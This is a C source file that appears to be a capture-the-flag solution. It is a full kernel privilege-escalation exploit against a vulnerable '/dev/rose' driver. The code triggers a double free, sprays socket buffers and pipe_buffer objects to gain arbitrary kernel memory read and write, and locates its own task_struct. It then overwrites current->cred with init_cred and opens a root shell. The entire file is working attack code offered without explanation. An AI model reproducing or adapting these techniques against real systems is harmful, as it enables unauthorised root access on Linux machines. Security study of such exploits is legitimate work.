#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/prctl.h>
#include <arpa/inet.h>

#define PAGE_SIZE 4096
#define PIPE_SPRAY 16

#define SLAB 1024

#define SKBUF_HDR 320
#define SKBUF_SPRAY 80

#define PROC_NAME "pwn_process_123"
#define MASK 0xfffffffff0000000
uint64_t vmemmap_base;
uint64_t virt_to_phys(uint64_t addr)
{
    return addr & 0x3fffffff;
}

long phys_to_page(long target_object)
{
    return vmemmap_base + (((target_object & 0xffffffff) >> 12) * 0x40);
}

struct pipe_buffer
{
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

int open_dev(void){
    int fd = open("/dev/rose", O_RDWR);
    if(fd < 0){
        perror("[-] open dev");
    }
    return fd;
}

void debug(void)
{
    puts("[*] Paused execution");
    getchar();
}

uint8_t isheap(uint64_t ptr)
{
    int high = ptr >> 44;
    if (high >= 0xffff8 && high < 0xfffff)
    {
        return 1;
    }
    return 0;
}

int main(void){
    // Setup skbuf
    int sock[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock) < 0)
    {
        perror("[-] socketpair");
        return -1;
    }

    // Allocate victim obj and free once
    puts("[*] Create dangling free-ptr");
    int fd[2];
    fd[0] = open_dev();
    fd[1] = open_dev();

    // Overlap victim w/ skbuf
    close(fd[0]);
    uint8_t skbuf[SLAB - SKBUF_HDR];
    memset(&skbuf, 0x41, SLAB - SKBUF_HDR);
    for (int _ = 0; _ < SKBUF_SPRAY; _++)
    {
        if (write(sock[0], &skbuf, SLAB - SKBUF_HDR) < 0)
        {
            perror("[-] write(socket)");
        }
    }

    // Trigger double-free
    puts("[*] Free skbuf");
    close(fd[1]);

    // Overlap skbuf w/ pipe_buffer
    int fdflags;
    int pfd[PIPE_SPRAY][2];
    for (int i = 0; i < PIPE_SPRAY; i++){
        if (pipe(pfd[i])){
            perror("[-] pipe");
        }
        fdflags = fcntl(pfd[i][0], F_GETFL, 0);
        fcntl(pfd[i][0], F_SETFL, fdflags | O_NONBLOCK);
        fdflags = fcntl(pfd[i][1], F_GETFL, 0);
        fcntl(pfd[i][1], F_SETFL, fdflags | O_NONBLOCK);
    }
    for(int i = 0; i < PIPE_SPRAY; i++) {
        write(pfd[i][1], "pwn", 3);
    }

    // Read pipe_buffer skbuf
    uint8_t tmp[SLAB - SKBUF_HDR] = {0};
    for (int _ = 0; _ < SKBUF_SPRAY; _++)
    {
        if (read(sock[1], &tmp, SLAB - SKBUF_HDR) < 0)
        {
            perror("[-] read(socket)");
        }
        if (((uint64_t *)tmp)[0] != 0x4141414141414141){
            memcpy(&skbuf, &tmp, SLAB - SKBUF_HDR);
            puts("[+] Found pipe");
        }
    }

    struct pipe_buffer *pipe = (struct pipe_buffer *)&skbuf;
    vmemmap_base = pipe->page & MASK;
    uint64_t init_cred = pipe->ops + 0x633440;
    printf("[*] pipe->page @ 0x%lx\n", pipe->page);
    printf("[*] init_cred @ 0x%lx\n", init_cred);
    printf("[*] vmemmap_base @ 0x%lx\n", vmemmap_base);

    uint8_t data[PAGE_SIZE] = {0};
    int evil_idx;

    // Find our task_struct
    prctl(PR_SET_NAME, PROC_NAME);
    uint64_t task_page, cred_off;

    for (uint64_t i = 0;; i++){
        int found = 0;
        pipe->page = vmemmap_base + 0xa0000 + 0x40 * i;
        pipe->len = PAGE_SIZE + 1;

        printf("\r[*] Scanning 0x%lx", pipe->page);
        for (int _ = 0; _ < 80; _++)
        {
            if (write(sock[0], &skbuf, SLAB - SKBUF_HDR) < 0)
            {
                perror("\n[-] write(socket)");
            }
        }

        for (int j = 0; j < PIPE_SPRAY; j++)
        {
            memset(&data, 0, PAGE_SIZE);
            if (read(pfd[j][0], &data, PAGE_SIZE) < 0)
            {
                continue;
            }

            if(!memcmp(&data, "pwn", 3)){
                continue;
            }

            uint64_t *locate = (uint64_t *)memmem(&data, PAGE_SIZE, PROC_NAME, sizeof(PROC_NAME));
            if(!locate){
                continue;
            }

            if(isheap(locate[-6])){
                puts("\n[+] Found task");
                printf("[*] current->cred @ 0x%lx\n", locate[-6]);
                printf("[*] current->comm @ %s\n", (char *)locate);
                found = 1;
                task_page = pipe->page;
                cred_off = (&locate[-6] - (uint64_t *)&data) * sizeof(uint64_t);
                printf("[*] cred_off 0x%lx\n", cred_off);
                evil_idx = j;
                break;
            }
        }   

        for (int _ = 0; _ < SKBUF_SPRAY; _++)
        {
            if (read(sock[1], &skbuf, SLAB - SKBUF_HDR) < 0)
            {
                perror("[-] read(socket)");
            }
        }

        if(found){
            break;
        }
    }

    // Overwrite creds
    pipe->page = task_page;
    pipe->offset = cred_off;
    pipe->len = 0;
    printf("[*] pipe->page @ 0x%lx\n", pipe->page);
    printf("[*] pipe->offset @ 0x%x\n", pipe->offset);

    for (int _ = 0; _ < SKBUF_SPRAY; _++)
    {
        if (write(sock[0], &skbuf, SLAB - SKBUF_HDR) < 0)
        {
            perror("[-] write(socket)");
        }
    }

    puts("[*] Overwritting current->cred");
    memset(&data, 0, PAGE_SIZE);
    if (write(pfd[evil_idx][1], &init_cred, sizeof(uint64_t)) < 0)
    {
        perror("[-] write(pipe)");
    }

    if (getuid() == 0){
        puts("[+] Got root");
        system("/bin/sh");
    }

    sleep(13371337);
    return 0;
}